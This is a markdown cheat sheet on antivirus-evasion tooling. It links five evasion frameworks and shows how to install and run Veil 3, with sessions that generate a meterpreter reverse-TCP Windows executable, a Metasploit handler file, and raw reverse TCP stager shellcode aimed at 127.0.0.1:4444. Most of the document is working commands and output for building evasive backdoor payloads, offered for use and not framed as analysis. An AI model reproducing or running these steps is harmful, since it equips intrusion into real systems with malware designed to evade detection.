
# Options:
1. https://github.com/Veil-Framework/Veil
2. https://github.com/oddcod3/Phantom-Evasion
3. https://github.com/govolution/avet
4. https://github.com/persianhydra/Xeexe-TopAntivirusEvasion
5. https://github.com/Ch0pin/AVIator

# Veil 3 Kali's Quick Install
```
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
```

# Veil 3 Help
```
$ ./Veil.py --help
usage: Veil.py [--list-tools] [-t TOOL] [--update] [--setup] [--config]
               [--version] [--ip IP] [--port PORT] [--list-payloads]
               [-p [PAYLOAD]] [-o OUTPUT-NAME]
               [-c [OPTION=value [OPTION=value ...]]]
               [--msfoptions [OPTION=value [OPTION=value ...]]] [--msfvenom ]
               [--compiler pyinstaller] [--clean] [--ordnance-payload PAYLOAD]
               [--list-encoders] [-e ENCODER] [-b \x00\x0a..] [--print-stats]

Veil is a framework containing multiple tools.

[*] Veil Options:
  --list-tools          List Veil's tools
  -t TOOL, --tool TOOL  Specify Veil tool to use (Evasion, Ordnance etc.)
  --update              Update the Veil framework
  --setup               Run the Veil framework setup file & regenerate the
                        configuration
  --config              Regenerate the Veil framework configuration file
  --version             Displays version and quits

[*] Callback Settings:
  --ip IP, --domain IP  IP address to connect back to
  --port PORT           Port number to connect to

[*] Payload Settings:
  --list-payloads       Lists all available payloads for that tool

[*] Veil-Evasion Options:
  -p [PAYLOAD]          Payload to generate
  -o OUTPUT-NAME        Output file base name for source and compiled binaries
  -c [OPTION=value [OPTION=value ...]]
                        Custom payload module options
  --msfoptions [OPTION=value [OPTION=value ...]]
                        Options for the specified metasploit payload
  --msfvenom []         Metasploit shellcode to generate (e.g.
                        windows/meterpreter/reverse_tcp etc.)
  --compiler pyinstaller
                        Compiler option for payload (currently only needed for
                        Python)
  --clean               Clean out payload folders

[*] Veil-Ordnance Shellcode Options:
  --ordnance-payload PAYLOAD
                        Payload type (bind_tcp, rev_tcp, etc.)

[*] Veil-Ordnance Encoder Options:
  --list-encoders       Lists all available encoders
  -e ENCODER, --encoder ENCODER
                        Name of shellcode encoder to use
  -b \x00\x0a.., --bad-chars \x00\x0a..
                        Bad characters to avoid
  --print-stats         Print information about the encoded shellcode
$
```

# Veil 3 Evasion CLI
```
$ ./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

runtime/internal/sys
runtime/internal/atomic
runtime
errors
internal/race
sync/atomic
math
sync
io
unicode/utf8
internal/syscall/windows/sysdll
unicode/utf16
syscall
strconv
reflect
encoding/binary
command-line-arguments
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: go
 [*] Payload Module: go/meterpreter/rev_tcp
 [*] Executable written to: /var/lib/veil/output/compiled/payload.exe
 [*] Source code written to: /var/lib/veil/output/source/payload.go
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc
$
$ file /var/lib/veil/output/compiled/payload.exe
/var/lib/veil/output/compiled/payload.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
$
```

# Veil 3 Ordnance CLI
```
$ ./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 127.0.0.1 --port 4444
===============================================================================
                                   Veil-Ordnance
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Payload Name: Reverse TCP Stager (Stage 1)
 [*] IP Address: 127.0.0.1
 [*] Port: 4444
 [*] Shellcode Size: 287

\xfc\xe8\x86\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x8b\x4c\x10\x78\xe3\x4a\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x89\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x09\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3
$
```
